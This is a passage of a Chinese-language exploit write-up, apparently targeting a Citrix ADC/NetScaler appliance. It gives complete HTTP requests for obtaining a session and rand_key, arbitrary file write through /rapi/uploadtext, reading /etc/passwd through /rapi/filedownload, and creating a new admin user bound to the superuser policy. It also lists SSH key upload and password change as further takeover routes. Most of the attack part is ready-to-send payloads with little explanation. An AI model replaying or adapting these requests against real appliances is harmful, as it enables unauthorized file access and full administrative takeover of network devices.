    User-Agent: python-requests/2.24.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Type: application/xml
    X-NITRO-USER: Twjf2fOW
    X-NITRO-PASS: Du16oQQ0
    Content-Length: 42
###  0x2 获取随机数
根据原作者的描述以及自己的调试，session的使用需要设置rand_key
在代码中也有对session和rand_key的校验
此时如果不一致将会404就像代码的逻辑一样。但是这个也是很好获取的，访问带有header的php就可以获取到
作者给的是
    GET /menu/stc HTTP/1.1
    Host: citrix.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Cookie: SESSID=05afba59ef8e0e35933f3bc266941337
    Upgrade-Insecure-Requests: 1
就这样带着session和rand_key 就可以干一些事情了
###  0x3 任意文件写
在rapi.php的main 函数中存在一个大switch case，其中有很多关键函数
prepare_text_upload 函数中存在文件写操作
发送如下数据包 注意修改session和rand_key
    POST /rapi/uploadtext HTTP/1.1
    Host: citrix.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://citrix.local/menu/neo
    DNT: 1
    rand_key: 1179557566.1594810901289502
    Connection: close
    Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; SESSID=6c8e255a118516ff2cb50fa2ee6cbda1; rdx_pagination_size=25%20Per%20Page
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 80
    object={"uploadtext":{"filedir":"/tmp","filedata":"test","filename":"test.txt"}}
这里的文件目录主要是根据filename生成，会先删除该文件然后再创建，该部分逻辑如下图所示。
写入效果如下
###  0x4 任意文件读
在同一个函数有一个 filedownload函数，该功能可以实现文件下载
指定path参数 此用url编码 `path:%2fetc%2fpasswd`
    POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
    Host: 192.168.1.131
    User-Agent: python-requests/2.24.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Type: application/xml
    X-NITRO-USER: onu1IQgD
    X-NITRO-PASS: FGsE6MyM
    rand_key: 1637785190.1594812669375542
    Cookie: SESSID=275cd8c53c9a1b710e051079183e3427; is_cisco_platform=0; startupapp=neo
    Content-Length: 31
###  0x5 获取系统权限
可以采用多种方法获取系统权限
  * 上传ssh 公钥，直接连接
  * 修改用户名密码，直接登录
  * 创建新用户，登录获取shell
这里把创建新用户的数据包贴出来
第一个包创建用户
    POST /nitro/v1/config/systemuser HTTP/1.1
    Host: 192.168.3.18:9080
    Content-Length: 83
    Cache-Control: max-age=0
    Accept: application/json
    rand_key: 845810655.1594556994263502
    NITRO_WEB_APPLICATION: true
    If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    DNT: 1
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo
    Connection: close
    object={"params":{"warning":"YES"},"systemuser":{"username":"nsroot1","password":"nsroot1","timeout":"900","maxsession":"20","logging":"ENABLED","externalauth":"ENABLED"}}
第二个包修改为superuser权限
    POST /nitro/v1/config/systemuser_systemcmdpolicy_binding HTTP/1.1
    Host: 192.168.3.18:9080
    Content-Length: 83
    Cache-Control: max-age=0
    Accept: application/json
    rand_key: 845810655.1594556994263502
    NITRO_WEB_APPLICATION: true
    If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    DNT: 1
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo
    Connection: close
    object={"params":{"warning":"YES"},"systemuser_systemcmdpolicy_binding":{"policyname":"superuser","priority":"0","username":"nsroot1"}}
## 0x05 参考链接